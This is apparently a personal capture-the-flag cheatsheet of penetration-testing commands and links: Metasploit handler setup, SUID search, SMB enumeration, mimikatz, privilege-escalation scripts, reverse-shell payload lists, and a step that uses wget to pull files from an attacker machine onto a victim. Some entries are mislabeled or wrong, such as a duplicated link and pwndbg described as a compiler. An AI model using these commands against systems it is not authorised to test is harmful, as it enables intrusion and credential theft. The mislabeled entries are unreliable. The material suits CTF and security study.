# my-CTF-s-Cheatsheets-global-reference

1. STEGANOGRAPHY :  

https://0xrick.github.io/lists/stego/

2. HASHCAT METHODS :

https://hashcat.net/hashcat/#features-algos

3.EXPLOIT ENUMERATION : 

 *Exploit-db 
 *CVE-Mitre 
 *Rapid7 
 
 LINUX CLI INTERFACE : 
 
  searchsploit *name-of-the-vulnerability*
  
 4. WORDPRESS VULNERABILITY ENUMERATION : 
 
 https://wpvulndb.com/
 
 LINUX CLI -----> wpscan -h
 
 5. METASPLOIT : 
 
 *SETTING MSFLISTENER ----> use multi/handler 
 setting payload ----> set PAYLOAD *name of the payload*
 
 FINDING LOCAL EXPLOITS IN POST EXPLOITATION PROCESS : 
 COMMAND --->use post/multi/recon/local_exploit_suggester
 
 CONVERTING A SHELL TO A METERPRETER : 
 
 CMD ----> search shell_to_meterpreter in msfconsole menu

 6. NMAP : 
 
 TABLE FOR BASIC ENUMERATION COMMANDS;
 
 nmap-flag	                                         Description
-sV	                                                 Attempts to determine the version of the services running
-p <x> or -p-	                                       Port scan for port <x> or scan all ports
-Pn                                                  Disable host discovery and just scan for open ports
-A	                                                 Enables OS and version detection, executes in-build scripts for further enumeration 
-sC	                                                 Scan with the default nmap scripts
-v	                                                 Verbose mode
-sU	                                                 UDP port scan
-sS	                                                 TCP SYN port scan
  
CHEATSHEETS FOR NMAP :

https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
https://www.tutorialspoint.com/nmap-cheat-sheet

7.WEB APP DIRECTORY BRUTEFORCING(HIDDEN DIRECTORIES) : 

GoBuster-flag	                                       Description
-e	                                                 Print the full URLs in your console
-u	                                                 The target URL to bruteforce
-w	                                                 Path to your wordlist to crack with it
-U and -P	                                          Single known Username and Password for Basic Auth
-p <x>	                                             Proxy to use for requests
-x                                                  Extensions to search with the directory
  
 8. SEARCHING FOR SUID FILES FROM THE ROOT DIRECTORY : 
 
 CMD -----> : find / -user root -perm -4000 -exec ls -ldb {} \;
 
 9.PRIVELEGE ESCALATION THROUGH SUID :
 
 https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
 
 10.PRIVELEGE ESCALATION REFERENCE :
 
 https://www.hackingarticles.in/privilege-escalation-cheatsheet-vulnhub/
 
 11. SMB ENUMERATION :
 
 CMD -----> smbmap -H TARGET_IP (FOR SCANNING USERNAMES OF THE GIVEN DOMAIN OR TARGET IP)
 
 12.FILE TRANSFER FROM OUR ATTACKER'S MACHINE TO THE REMOTE OR VICTIM'S MACHINE :
 
 *wget
 *scp
 *lcd
 SCP :
 
 * scp filename hostuser@target_ip:/path_to_upload(/tmp)
 
 * wget http://local_ip/file_to_upload
 
 13.WINDOWS PRIVELEGE ESCALATION :
 
 mimikatz : open-source for user authentication systems 
 
 https://www.varonis.com/blog/what-is-mimikatz/
 
 service : lsaas service
 
 kiwi : most updated version of mimikatz
 
 14.OHSINT TOOLS :
 
 exiftool : extract metadata of an image with crucial copyrights name
 
 sherlock : https://github.com/sherlock-project/sherlock
 
 wigle : https://www.wigle.net/   ----> for finding the location of the WAP and ssid using the bssid more specifically.
 
 15.SCRIPTS FOR PRIVELEGE ESCALATION : 
 
 LINENUM :
 
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 
 IMPAKCET :
 
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 LINUX KERNEL EXPLOIT SUGGESTER : 
 
 https://github.com/mzet-/linux-exploit-suggester/
 
 16.USE PWNDBG AND GDB FOR COMPILING PROGRAMS AND BINARY FILES : 
 
 https://docs.pwntools.com
 
 17.ONLINE HASH CRACKING LINKS : 
 
 CRACKSTATION:  https://crackstation.net/
 
 HASHRC: https://md5hashing.net/
 
 ROT-CIPHER: https://www.dcode.fr/rot-cipher
 
 MORSE-DECODER: 
 
 18.REVERSE-SHELL-CHEATSHEETS:
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 19.COMMON PASSWORDS LIST FOR BRUTEFORCING : 
 
 https://github.com/DavidWittman/wpxmlrpcbrute/blob/master/wordlists/1000-most-common-passwords.txt
